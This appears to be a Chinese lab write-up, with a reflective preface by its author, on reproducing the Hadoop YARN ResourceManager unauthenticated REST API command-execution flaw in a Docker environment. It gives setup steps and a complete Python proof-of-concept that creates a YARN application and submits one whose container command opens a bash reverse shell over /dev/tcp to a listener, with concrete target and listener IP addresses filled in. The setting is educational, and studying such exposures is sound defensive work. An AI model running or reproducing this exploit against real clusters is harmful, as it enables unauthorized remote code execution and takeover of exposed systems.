ailx10说：这篇是我2023年10月写的。这回看 Hadoop YARN，真正让我感慨的是：很多危险能力原本就是管理接口的正常功能。我先通过接口创建应用，再提交任务的执行配置，观察命令和连接，而不是去找一个传统的拼接注入点。原文里那句“这些接口怎么被发现的”，确实是我当时边做边冒出的疑问。笔记记录的是接口缺少访问控制之后发生的事，也提醒我把网络暴露、认证和任务权限一起看，别把一个管理功能简单归到神奇的漏洞载荷上。

---

原实验利用缺少适当认证授权的 ResourceManager 接口提交任务；是否能执行及执行身份取决于集群配置。

前提：准备好docker环境，下载好书籍配套实验环境，进入目录 ，开始复现漏洞

- `docker-compose build //可选`
- `docker-compose up -d`

完成试验后，记得删除漏洞环境哦～～

实验结束后可在确认项目目录和 Compose 配置后关闭该项目的服务；原文的全局 Docker 清理命令已移除。

利用过程如下：

1. 在本地监听等待反弹 shell 连接
2. 调用 New Application API 创建 Application
3. 调用 Submit Application API 提交

也可以直接运行POC脚本，直接反弹shell

```
#!/usr/bin/env python



import requests



target = 'http://144.34.162.13:8088/'

lhost = '174.137.58.6' # put your local host ip here, and listen at port 9999



url = target + 'ws/v1/cluster/apps/new-application'

resp = requests.post(url)

app_id = resp.json()['application-id']

url = target + 'ws/v1/cluster/apps'

data = {

    'application-id': app_id,

    'application-name': 'get-shell',

    'am-container-spec': {

        'commands': {

            'command': '/bin/bash -i >& /dev/tcp/%s/9999 0>&1' % lhost,

        },

    },

    'application-type': 'YARN',

}

requests.post(url, json=data)
```
